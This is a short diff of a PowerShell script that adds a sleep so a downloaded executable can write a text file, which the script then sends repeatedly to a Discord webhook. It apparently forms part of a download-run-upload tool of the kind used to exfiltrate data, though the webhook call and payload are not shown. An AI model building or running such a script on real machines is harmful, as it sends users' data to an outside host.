@@ -63,6 +63,9 @@ if (Test-Path $downloadPath) {
         Write-Host "Discord Webhook Response: $responseText"
     }
 
+    # Sleep for a few seconds to allow time for the executable to create the text file
+    Start-Sleep -Seconds 10  # Adjust the delay time as needed
+
  # Send the file to Discord a maximum of 10 times
 $maxSendCount = 2       # Maximum number of times to send the file
 $sendCount = 0          # Initialize the send count
